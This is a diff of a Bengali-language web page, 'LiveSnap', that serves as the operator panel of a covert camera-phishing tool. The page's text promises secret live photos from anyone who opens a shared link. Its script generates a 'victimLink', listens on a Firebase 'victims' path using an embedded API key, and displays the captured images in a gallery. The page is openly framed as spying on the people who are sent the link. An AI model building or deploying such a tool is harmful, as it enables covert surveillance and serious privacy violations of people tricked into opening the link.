@@ -1,242 +1,90 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>LiveSnap • গোপন ছবি লাইভ দেখুন</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700;800&display=swap" rel="stylesheet">
-  <style>
-    * { margin:0; padding:0; box-sizing:border-box; }
-    body {
-      font-family: 'Poppins', sans-serif;
-      background: linear-gradient(to bottom, #f8f9fa, #ffffff);
-      color: #222;
-      min-height: 100vh;
-    }
-    header {
-      background: #000;
-      padding: 30px 0;
-      text-align: center;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-    }
-    .logo {
-      height: 100px;
-      border-radius: 50%;
-      border: 5px solid #ff0050;
-      box-shadow: 0 0 30px rgba(255,0,80,0.5);
-      animation: glow 4s infinite alternate;
-    }
-    @keyframes glow {
-      from { box-shadow: 0 0 30px rgba(255,0,80,0.5); }
-      to { box-shadow: 0 0 50px rgba(255,0,80,0.8); }
-    }
-    .container {
-      max-width: 900px;
-      margin: 50px auto;
-      padding: 20px;
-      text-align: center;
-    }
-    h1 {
-      font-size: 3.5em;
-      margin: 20px 0;
-      background: linear-gradient(90deg, #ff0050, #ff4500);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      font-weight: 800;
-    }
-    p {
-      font-size: 1.4em;
-      color: #444;
-      margin: 20px auto;
-      max-width: 750px;
-    }
-    .thumb {
-      width: 100%;
-      max-width: 650px;
-      border-radius: 20px;
-      margin: 40px auto;
-      box-shadow: 0 15px 40px rgba(0,0,0,0.15);
-      border: 3px solid #eee;
-    }
-    .btn {
-      background: #ff0050;
-      color: white;
-      padding: 18px 55px;
-      font-size: 1.5em;
-      font-weight: bold;
-      border: none;
-      border-radius: 50px;
-      cursor: pointer;
-      margin: 15px;
-      transition: all 0.3s;
-      box-shadow: 0 10px 30px rgba(255,0,80,0.4);
-    }
-    .btn:hover {
-      transform: translateY(-6px);
-      box-shadow: 0 20px 40px rgba(255,0,80,0.5);
-    }
-    #linkBox {
-      margin: 50px auto;
-      padding: 35px;
-      background: white;
-      border-radius: 20px;
-      max-width: 750px;
-      box-shadow: 0 10px 40px rgba(0,0,0,0.1);
-      border: 2px dashed #ff0050;
-      display: none;
-    }
-    #victimLink {
-      width: 100%;
-      padding: 18px;
-      font-size: 1.3em;
-      border: 2px solid #ddd;
-      border-radius: 15px;
-      background: #fff8f8;
-      text-align: center;
-      margin: 20px 0;
-      color: #d00040;
-      font-weight: bold;
-      word-break: break-all;
-    }
-    .gallery-section {
-      margin-top: 80px;
-      padding: 40px 20px;
-      background: #f8f9fa;
-      border-radius: 20px;
-      box-shadow: inset 0 5px 20px rgba(0,0,0,0.05);
-    }
-    .gallery-section h2 {
-      font-size: 2.2em;
-      margin-bottom: 30px;
-      color: #ff0050;
-    }
-    .grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
-      gap: 20px;
-      max-width: 1200px;
-      margin: 0 auto;
-    }
-    .grid img {
-      width: 100%;
-      height: 200px;
-      object-fit: cover;
-      border-radius: 15px;
-      border: 4px solid #ff0050;
-      box-shadow: 0 8px 25px rgba(0,0,0,0.2);
-      transition: 0.3s;
-      cursor: pointer;
-    }
-    .grid img:hover {
-      transform: scale(1.05);
-      box-shadow: 0 15px 40px rgba(255,0,80,0.4);
-    }
-    .no-photos {
-      text-align: center;
-      font-size: 1.6em;
-      color: #888;
-      padding: 60px;
-    }
-    footer {
-      text-align: center;
-      padding: 50px;
-      background: #000;
-      color: white;
-      margin-top: 100px;
-      font-size: 1.2em;
-    }
-    footer a { color: #ff0050; text-decoration: none; font-weight: bold; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LiveSnap • লাইভ ছবি দেখুন</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Arial,sans-serif;background:#fff;color:#222}
+header{background:#000;padding:30px;text-align:center}
+.logo{height:90px;border-radius:50%;border:4px solid #ff0050}
+.container{max-width:900px;margin:40px auto;padding:20px;text-align:center}
+h1{font-size:2.8em;color:#ff0050;margin:20px 0}
+.btn{background:#ff0050;color:#fff;padding:16px 50px;font-size:1.4em;border:none;border-radius:50px;cursor:pointer;margin:15px}
+#linkBox{display:none;margin:40px auto;padding:30px;background:#f9f9f9;border:2px dashed #ff0050;border-radius:20px;max-width:700px}
+#victimLink{width:100%;padding:15px;font-size:1.2em;border:1px solid #ddd;border-radius:10px;margin:15px 0;word-break:break-all;background:#fff}
+.gallery{margin-top:60px}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:15px;margin-top:20px}
+.grid img{width:100%;border-radius:12px;border:3px solid #ff0050;box-shadow:0 5px 15px rgba(0,0,0,0.2);cursor:pointer}
+.noimg{color:#888;font-size:1.5em;margin:50px}
+</style>
 </head>
 <body>
 
-<header>
-  <img src="https://i.ibb.co.com/5YZpX7K/logo.png" alt="LiveSnap" class="logo">
-</header>
+<header><img src="https://i.ibb.co.com/5YZpX7K/logo.png" class="logo" alt="Logo"></header>
 
 <div class="container">
   <h1>গোপনে লাইভ ছবি দেখুন</h1>
-  <p>যে কেউ লিংকে ক্লিক করলেই তার ফোনের ক্যামেরা থেকে ছবি সাথে সাথে এখানে চলে আসবে!</p>
-  
-  <img src="https://i.ibb.co.com/4pJ3T1F/thumb.jpg" alt="Demo" class="thumb">
-
-  <button class="btn" onclick="generateLink()">নতুন গোপন লিংক তৈরি করুন</button>
+  <p>লিংক শেয়ার করুন → কেউ খুললেই ছবি এখানে চলে আসবে!</p>
+  <button class="btn" onclick="generateLink()">নতুন লিংক তৈরি করুন</button>
 
   <div id="linkBox">
-    <h2 style="color:#ff0050; margin-bottom:20px;">তোমার লিংক রেডি!</h2>
-    <input type="text" id="victimLink" readonly />
-    <br><br>
+    <h3 style="color:#ff0050">তোমার লিংক রেডি!</h3>
+    <input type="text" id="victimLink" readonly>
     <button class="btn" onclick="copyLink()">কপি করুন</button>
   </div>
 
-  <div class="gallery-section">
-    <h2>লাইভ ছবি গ্যালারি</h2>
-    <div class="no-photos" id="noPhotos">কোনো ছবি এখনো আসেনি। লিংক শেয়ার করুন!</div>
-    <div class="grid" id="gallery"></div>
+  <div class="gallery">
+    <h2 style="color:#ff0050">লাইভ ছবি</h2>
+    <div class="noimg" id="noimg">এখনো কোনো ছবি আসেনি...</div>
+    <div class="grid" id="grid"></div>
   </div>
 </div>
 
-<footer>
-  © 2025 COPYRIGHT BY <a href="#">X4XOR</a> · ATI LINKABLE THAKBE
-</footer>
-
-<!-- Firebase -->
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
-
 <script>
 const firebaseConfig = {
   apiKey: "AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",
   authDomain: "cam-snap-8e956.firebaseapp.com",
   databaseURL: "https://cam-snap-8e956-default-rtdb.firebaseio.com",
   projectId: "cam-snap-8e956",
-  storageBucket: "cam-snap-8e956.firebasestorage.app",
-  messagingSenderId: "982089892260",
-  appId: "1:982089892260:web:2cfa5a4d3b3dbcf45d0131",
-  measurementId: "G-S5S37F55T6"
+  appId: "1:982089892260:web:2cfa5a4d3b3dbcf45d0131"
 };
-
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
 let currentId = null;
 
-function generateLink() {
-  currentId = Date.now().toString(36) + Math.random().toString(36).substr(2, 8);
-  const base = location.href.split('/').slice(0, -1).join('/') + '/';
-  const victimUrl = base + "view.html?id=" + currentId;
-
+function generateLink(){
+  currentId = Date.now().toString(36);
+  const base = location.href.split('/').slice(0,-1).join('/') + '/';
+  const link = base + "view.html?id=" + currentId;
   document.getElementById("linkBox").style.display = "block";
-  document.getElementById("victimLink").value = victimUrl;
-
-  document.getElementById("gallery").innerHTML = "";
-  document.getElementById("noPhotos").style.display = "block";
-  loadPhotos(currentId);
+  document.getElementById("victimLink").value = link;
+  document.getElementById("grid").innerHTML = "";
+  document.getElementById("noimg").style.display = "block";
+  loadPhotos();
 }
-
-function copyLink() {
-  const link = document.getElementById("victimLink");
-  link.select();
-  document.execCommand("copy");
-  alert("লিংক কপি হয়ে গেছে!");
+function copyLink(){
+  const input = document.getElementById("victimLink");
+  input.select(); document.execCommand("copy");
+  alert("কপি হয়ে গেছে!");
 }
-
-function loadPhotos(id) {
-  if (!id) return;
-  db.ref(`victims/${id}`).on('value', snap => {
-    const gallery = document.getElementById('gallery');
-    const noPhotos = document.getElementById('noPhotos');
-    gallery.innerHTML = '';
-
-    if (snap.val()) {
-      noPhotos.style.display = 'none';
-      const photos = Object.values(snap.val()).sort((a,b) => b.time - a.time);
-      photos.forEach(p => {
-        const img = document.createElement('img');
-        img.src = p.url;
-        img.onclick = () => window.open(p.url, '_blank');
-        gallery.appendChild(img);
+function loadPhotos(){
+  if(!currentId) return;
+  db.ref("victims/"+currentId).on("value", s=>{
+    const grid = document.getElementById("grid");
+    const noimg = document.getElementById("noimg");
+    grid.innerHTML = "";
+    if(s.val()){
+      noimg.style.display = "none";
+      Object.values(s.val()).reverse().forEach(img=>{
+        const i = document.createElement("img");
+        i.src = img.data;
+        i.onclick = ()=>window.open(img.data);
+        grid.appendChild(i);
       });
     }
   });
